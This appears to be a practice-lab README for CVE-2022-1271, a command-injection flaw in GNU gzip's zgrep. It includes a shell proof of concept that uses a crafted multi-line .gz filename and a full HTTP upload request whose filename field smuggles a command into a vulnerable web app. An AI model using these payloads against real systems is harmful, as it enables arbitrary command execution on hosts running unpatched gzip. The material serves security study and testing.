**CVE-2022-1271 information**

An arbitrary file write vulnerability was found in GNU gzip's zgrep utility. When zgrep is applied on the attacker's chosen file name (for example, a crafted file name), this can overwrite an attacker's content to an arbitrary attacker-selected file. This flaw occurs due to insufficient validation when processing filenames with two or more newlines where selected content and the target file names are embedded in crafted multi-line file names. This flaw allows a remote, low privileged attacker to force zgrep to write arbitrary files on the system.

**Example of attack**

We can do command injection inside gz filename.

```
touch foo.gz
   $ echo foo | gzip > "$(printf '|\n;e cowsay pwned\n#.gz')"
   $ zgrep foo *.gz
    _______
   < pwned >
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||
   foo
```

In this repo, I created the web application wich contain gzip affected version (< 1.12).

We can upload exploit gz file to exploit command injection. Example payload was below:

```
POST /upload.php HTTP/1.1
Host: secplayground.com
Content-Length: 357
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGQB8xjgKZt6PtdGr
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9,th-TH;q=0.8,th;q=0.7,en-US;q=0.6,zh-TW;q=0.5,zh-CN;q=0.4,zh;q=0.3,ja;q=0.2
Connection: close

------WebKitFormBoundaryGQB8xjgKZt6PtdGr
Content-Disposition: form-data; name="uploaded"; filename="|%0A;e touch pwned %0A#.gz"
Content-Type: application/x-gzip

+(ÏKMáû^³
------WebKitFormBoundaryGQB8xjgKZt6PtdGr
Content-Disposition: form-data; name="submit"

Upload Image
------WebKitFormBoundaryGQB8xjgKZt6PtdGr--

```

Source: https://seclists.org/oss-sec/2022/q2/20

